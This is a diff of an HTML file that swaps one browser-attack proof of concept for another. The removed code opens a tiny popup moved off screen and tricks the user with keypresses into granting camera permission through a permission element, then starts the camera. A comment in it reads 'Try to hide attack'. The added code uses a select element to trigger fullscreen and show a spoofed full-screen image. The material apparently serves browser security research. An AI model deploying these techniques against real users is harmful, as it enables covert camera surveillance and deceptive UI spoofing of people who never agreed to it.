@@ -1,68 +1,49 @@
-<!doctype html>
-<html>
-<head>
 <style>
-html { font-family: sans-serif; }
-#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+    select {
+        all: initial;
+
+
+    }
+
+    #front {
+        display: block;
+        top: 50vh;
+        left: 50vw;
+        position: fixed;
+
+    }
+
+    #spoofed {
+        display: none;
+        z-index: 1000;
+    }
+
+    * {
+        margin: 0;
+        overflow: hidden;
+
+    }
 </style>
-</head>
-<body>
-<h1>PoC: PEPC while off screen</h1>
-<p id="instructions">Press any key once</p>
+
+<div id="spoofed">
+    <img src="spoof.png" class="header" style="width: 100vw;height: 100vh;" />
+</div>
+<center id="front">
+    <select onmousedown="requestPermission()">
+        <option>Click to spoof</option>
+
+    </select>
+</center>
+
+
+
+
 <script>
-var searchParams = new URLSearchParams(window.location.search);
-var debug = searchParams.get('debug') == '1';
-
-var ran = false;
-window.addEventListener('keydown', async () => {
-    if (ran) {
-        return;
+    function requestPermission() {
+        var front = document.getElementById("front");
+        var spoofed = document.getElementById("spoofed");
+        document.documentElement.requestFullscreen();
+        spoofed.style.display = 'block';
+        front.style.opacity = "0";
     }
-    ran = true;
-    var newWin = window.open('about:blank', 'aoTest', 'width=1,height=1,left=10000,top=10000');
-
-    if (debug) {
-        // In debug mode, make window visible
-        newWin.resizeTo(500,500);
-    } else {
-        newWin.resizeTo(1,1);
-    }
-    newWin.moveTo(10000,10000);
-
-    newWin.eval(`
-        var granted = false;
-        window.addEventListener('blur', () => {
-            if (granted) { return; }
-            window.opener.instructions.innerText = 'Now press tab twice, then press enter';
-            window.addEventListener('focus', async () => {
-                if (granted) { return; }
-                var permStatus = await navigator.permissions.query({name: 'camera'});
-                if (permStatus.state == 'granted') {
-                    permElem.remove();
-                    navigator.mediaDevices.getUserMedia({video:true});
-                    granted = true;
-                    window.opener.instructions.innerText = 'Thank you!';
-                } else {
-                    // Try to hide attack (or alternatively, ask user to retry)
-                    window.close();
-                }
-            });
-        });
-    `);
-
-    newWin.eval(`
-        setInterval(() => {
-            if (!window.opener) { window.close(); }
-        }, 200);
-    `);
-
-    newWin.document.body.innerHTML = `
-        <style>#permElem { width: 1px; height: 1px; background: #fff; outline: none; color: #888; font-size: 11px; }</style>
-        <permission id="permElem" type="camera">
-    `;
-
-    instructions.innerText = 'Press tab once, then press enter.';
-});
 </script>
-</body>
-</html>
